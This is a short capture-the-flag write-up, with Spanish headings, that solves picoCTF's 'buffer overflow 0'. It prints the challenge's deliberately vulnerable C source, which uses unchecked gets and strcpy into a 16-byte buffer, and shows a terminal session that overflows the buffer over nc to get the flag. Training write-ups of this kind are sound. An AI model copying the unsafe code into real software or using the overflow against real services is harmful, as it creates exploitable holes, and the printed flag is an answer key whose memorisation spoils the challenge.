# Retos picoCTF

# Level buffer overflow 0

## Objetivo
Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. Connect using: nc saturn.picoctf.net 50309

## Solucion
```
┌──(kali㉿kali)-[~/Downloads/bufferOverflow0]
└─$ wget https://artifacts.picoctf.net/c/173/vuln                        
--2024-11-15 20:57:26--  https://artifacts.picoctf.net/c/173/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.161.55.100, 3.161.55.61, 3.161.55.64, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.161.55.100|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16016 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                100%[=================>]  15.64K  --.-KB/s    in 0s      

2024-11-15 20:57:27 (51.2 MB/s) - ‘vuln’ saved [16016/16016]

                                                                              
┌──(kali㉿kali)-[~/Downloads/bufferOverflow0]
└─$ wget https://artifacts.picoctf.net/c/173/vuln.c
--2024-11-15 20:57:38--  https://artifacts.picoctf.net/c/173/vuln.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.161.55.61, 3.161.55.64, 3.161.55.26, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.161.55.61|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 808 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c              100%[=================>]     808  --.-KB/s    in 0s      

2024-11-15 20:57:39 (18.1 MB/s) - ‘vuln.c’ saved [808/808]

                                                                              
┌──(kali㉿kali)-[~/Downloads/bufferOverflow0]
└─$ ls
vuln  vuln.c
                                                                              
┌──(kali㉿kali)-[~/Downloads/bufferOverflow0]
└─$ cat vuln.c        
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
                                                                              
┌──(kali㉿kali)-[~/Downloads/bufferOverflow0]
└─$ ls -la       
total 56
drwxr-xr-x  2 kali kali  4096 Nov 15 20:57 .
drwxr-xr-x 27 kali kali 32768 Nov 15 20:45 ..
-rw-r--r--  1 kali kali 16016 Aug  4  2023 vuln
-rw-r--r--  1 kali kali   808 Aug  4  2023 vuln.c
                                                                              
┌──(kali㉿kali)-[~/Downloads/bufferOverflow0]
└─$ chmod 777 vuln
                                                                  
┌──(kali㉿kali)-[~/Downloads/bufferOverflow0]
└─$ ./vuln       
Please create 'flag.txt' in this directory with your own debugging
                                                                  
┌──(kali㉿kali)-[~/Downloads/bufferOverflow0]
└─$ nc saturn.picoctf.net 53337
Input: 123
The program will exit now
                                                                  
┌──(kali㉿kali)-[~/Downloads/bufferOverflow0]
└─$ nc saturn.picoctf.net 53337
Input: 123456789112345678
The program will exit now
                                                                  
┌──(kali㉿kali)-[~/Downloads/bufferOverflow0]
└─$ nc saturn.picoctf.net 53337
Input: 11111111111111111111111111111111111111111111
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
                                                                  
┌──(kali㉿kali)-[~/Downloads/bufferOverflow0]
└─$ 
```

## Referencias


